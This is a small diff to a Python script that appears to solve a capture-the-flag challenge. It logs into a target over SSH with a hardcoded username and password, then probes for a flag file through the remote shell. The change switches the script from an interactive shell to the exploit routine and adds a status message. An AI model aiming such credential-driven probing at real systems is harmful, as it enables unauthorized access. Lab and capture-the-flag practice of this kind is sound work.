@@ -22,6 +22,7 @@ def exploit(channel: Channel):
         
         result: str = channel.recv(4096).decode()
         print(result)
+        
         if(not result.__contains__("No such file or directory")):
             print("Found flag:\n" + result)
             break
@@ -40,6 +41,7 @@ def connect_with_ssh(hostname, username, password, action):
         # Invoke a shell
         channel = ssh.invoke_shell()
 
+        print("[+] connected successfully to target")
         action(channel)
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -79,4 +81,4 @@ password = 'M3g4C0rpUs3r!'    # Replace with your SSH password
 
 
 # Start the interactive shell
-connect_with_ssh(hostname, username, password, run_ssh_interactive_shell)
+connect_with_ssh(hostname, username, password, exploit)
